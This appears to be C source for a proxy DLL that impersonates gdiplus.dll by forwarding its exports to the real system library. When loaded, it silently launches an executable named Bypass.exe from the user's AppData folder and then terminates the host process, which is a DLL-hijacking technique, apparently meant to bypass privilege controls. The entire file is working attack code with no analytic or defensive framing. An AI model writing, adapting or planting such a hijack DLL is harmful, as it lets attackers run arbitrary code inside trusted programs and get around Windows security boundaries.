#pragma comment (linker, "/export:GdipAlloc=c:/windows/system32/gdiplus.GdipAlloc,@34")
#pragma comment (linker, "/export:GdipCloneBrush=c:/windows/system32/gdiplus.GdipCloneBrush,@46")
#pragma comment (linker, "/export:GdipCloneImage=c:/windows/system32/gdiplus.GdipCloneImage,@50")
#pragma comment (linker, "/export:GdipCreateBitmapFromStream=c:/windows/system32/gdiplus.GdipCreateBitmapFromStream,@74")
#pragma comment (linker, "/export:GdipCreateFromHDC=c:/windows/system32/gdiplus.GdipCreateFromHDC,@84")
#pragma comment (linker, "/export:GdipCreateHBITMAPFromBitmap=c:/windows/system32/gdiplus.GdipCreateHBITMAPFromBitmap,@87")
#pragma comment (linker, "/export:GdipCreateLineBrushI=c:/windows/system32/gdiplus.GdipCreateLineBrushI,@97")
#pragma comment (linker, "/export:GdipCreateSolidFill=c:/windows/system32/gdiplus.GdipCreateSolidFill,@122")
#pragma comment (linker, "/export:GdipDeleteBrush=c:/windows/system32/gdiplus.GdipDeleteBrush,@130")
#pragma comment (linker, "/export:GdipDeleteGraphics=c:/windows/system32/gdiplus.GdipDeleteGraphics,@135")
#pragma comment (linker, "/export:GdipDisposeImage=c:/windows/system32/gdiplus.GdipDisposeImage,@143")
#pragma comment (linker, "/export:GdipFillRectangleI=c:/windows/system32/gdiplus.GdipFillRectangleI,@219")
#pragma comment (linker, "/export:GdipFree=c:/windows/system32/gdiplus.GdipFree,@225")
#pragma comment (linker, "/export:GdiplusShutdown=c:/windows/system32/gdiplus.GdiplusShutdown,@608")
#pragma comment (linker, "/export:GdiplusStartup=c:/windows/system32/gdiplus.GdiplusStartup,@609")

#pragma warning(disable: 4996)

#include <Windows.h>
#include <tchar.h>

BOOL WINAPI DllMain(
	HINSTANCE hInstance,
	DWORD dwReason,
	LPVOID lpReserved
) {

	if (dwReason == DLL_PROCESS_ATTACH) {
		DWORD pathLength;
		TCHAR cmdBuf[MAX_PATH * 2], sysDir[MAX_PATH + 1];
		STARTUPINFO	startupInfo;
		PROCESS_INFORMATION	processInfo;

		RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
		RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
		startupInfo.cb = sizeof(startupInfo);
		GetStartupInfo(&startupInfo);

		wchar_t* appdata = _wgetenv(L"AppData");
		RtlSecureZeroMemory(sysDir, sizeof(sysDir));
		pathLength = ExpandEnvironmentStringsW(appdata, sysDir, MAX_PATH);

		if ((pathLength != 0) && (pathLength < MAX_PATH)) {
			RtlSecureZeroMemory(cmdBuf, sizeof(cmdBuf));
			_tcscpy_s(cmdBuf, sysDir);
			_tcscat_s(cmdBuf, TEXT("\\Bypass.exe"));

			if (CreateProcessW(cmdBuf, NULL, NULL, NULL, false, CREATE_NEW_CONSOLE, NULL, sysDir, &startupInfo, &processInfo)) {
				CloseHandle(processInfo.hProcess);
				CloseHandle(processInfo.hThread);
			}
		}
		ExitProcess(0);
	}

	return TRUE;
}